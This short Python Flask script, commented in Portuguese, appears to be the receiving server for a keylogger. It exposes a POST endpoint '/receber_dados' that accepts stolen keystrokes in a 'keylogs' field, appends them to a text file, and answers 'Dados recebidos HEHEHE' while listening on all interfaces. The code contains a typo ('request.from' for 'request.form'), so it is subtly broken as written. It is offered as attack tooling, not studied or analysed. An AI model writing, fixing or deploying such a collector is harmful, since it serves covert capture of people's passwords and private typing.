from flask import Flask, request

app = Flask(__name__)

@app.route('/receber_dados', methods=['POST'])
def receber_dados():
    keylogs = request.from.get('keylogs')
    with open("keylogs_recebidos.txt", "a") as f: #ou qualquer outro nome que voce queira)
        f.write(keylogs + "\n")
    return "Dados recebidos HEHEHE", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000) #PORTA Q VC QUISER



